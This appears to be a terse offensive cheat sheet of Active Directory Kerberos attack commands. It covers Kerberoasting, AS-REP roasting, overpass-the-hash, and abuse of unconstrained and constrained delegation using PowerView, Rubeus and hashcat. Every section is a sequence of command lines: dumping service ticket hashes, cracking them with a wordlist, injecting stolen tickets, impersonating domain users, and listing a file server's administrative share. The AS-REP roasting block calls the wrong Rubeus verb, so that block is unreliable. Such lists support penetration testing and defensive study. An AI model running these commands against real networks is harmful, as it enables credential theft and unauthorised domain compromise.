### Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
Rubeus kerberoast /outfile:hashes.asreproast
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```
### Overpass-the-Hash
```
Rubeus triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
```
### Unconstrained Delegation
```
PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
execute-assembly C:\Users\Public\Rubeus.exe triage
Rubeus dump /luid:0x1b37e  
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
```

### Constrained Delegation
```
powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
Rubeus dump /service:krbtgt
Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
ImpersonateProcess 3420
ls \\fs-1.cyberbotic.io\c$
```


